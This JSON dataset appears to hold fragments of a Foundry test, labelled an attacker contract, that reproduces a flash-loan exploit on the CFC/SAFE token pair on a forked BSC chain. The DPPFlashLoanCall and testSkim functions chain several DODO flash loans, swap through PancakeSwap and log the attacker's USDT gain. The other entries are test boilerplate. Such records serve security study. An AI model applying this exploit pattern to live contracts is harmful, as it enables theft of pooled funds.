[
  {
    "contract/interface": "CFCTest",
    "source_type": "attacker_contract",
    "function_name": "DPPFlashLoanCall",
    "original_code": "    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {\n        if (msg.sender == address(DPPOracle1)) {\n            takeFlashloan(DPPOracle2);\n        } else if (msg.sender == address(DPPOracle2)) {\n            takeFlashloan(DPPOracle3);\n        } else if (msg.sender == address(DPPOracle3)) {\n            takeFlashloan(DPP);\n        } else if (msg.sender == address(DPP)) {\n            takeFlashloan(DPPAdvanced);\n        } else {\n            BEP20USDT.approve(address(Router), type(uint256).max);\n            CFC.approve(address(Router), type(uint256).max);\n            SAFE.approve(address(Router), type(uint256).max);\n\n            address[] memory path = new address[](2);\n            path[0] = address(BEP20USDT);\n            path[1] = address(SAFE);\n            Router.swapExactTokensForTokens(13_000 * 1e18, 0, path, address(this), block.timestamp + 100);\n\n            (uint256 reserveSAFE, uint256 reserveCFC,) = CakeLP.getReserves();\n\n            uint256 amountOut = Router.getAmountOut(SAFE.balanceOf(address(this)), reserveSAFE, reserveCFC);\n\n            CakeLP.swap(1, (amountOut - (amountOut / 250)) - 1, address(this), hex\"307831323334\");\n\n",
    "description": ""
  },
  {
    "contract/interface": "CFCTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "CFCTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "CFCTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "CFCTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "CFCTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "CFCTest",
    "source_type": "attacker_contract",
    "function_name": "pancakeCall",
    "original_code": "    function pancakeCall(address _sender, uint256 _amount0, uint256 _amount1, bytes calldata _data) external {\n        //Repaying CakeLP (Pair) flashswap\n        SAFE.transfer(address(CakeLP), SAFE.balanceOf(address(this)));\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "CFCTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 29_116_478);\n        cheats.label(address(BEP20USDT), \"BEP20USDT\");\n        cheats.label(address(SAFE), \"SAFE\");\n        cheats.label(address(CFC), \"CFC\");\n        cheats.label(address(DPPOracle1), \"DPPOracle1\");\n        cheats.label(address(DPPOracle2), \"DPPOracle2\");\n        cheats.label(address(DPPOracle3), \"DPPOracle3\");\n        cheats.label(address(DPP), \"DPP\");\n        cheats.label(address(DPPAdvanced), \"DPPAdvanced\");\n        cheats.label(address(Router), \"Router\");\n        cheats.label(address(CakeLP), \"CakeLP\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "CFCTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "CFCTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "CFCTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "CFCTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "CFCTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "CFCTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "CFCTest",
    "source_type": "attacker_contract",
    "function_name": "testSkim",
    "original_code": "    function testSkim() public {\n        deal(address(BEP20USDT), address(this), 0);\n        emit log_named_decimal_uint(\n            \"Attacker BEP20USDT balance before attack\", BEP20USDT.balanceOf(address(this)), BEP20USDT.decimals()\n        );\n\n        takeFlashloan(DPPOracle1);\n\n        emit log_named_decimal_uint(\n            \"Attacker BEP20USDT balance after attack\", BEP20USDT.balanceOf(address(this)), BEP20USDT.decimals()\n        );\n    }\n\n",
    "description": ""
  }
]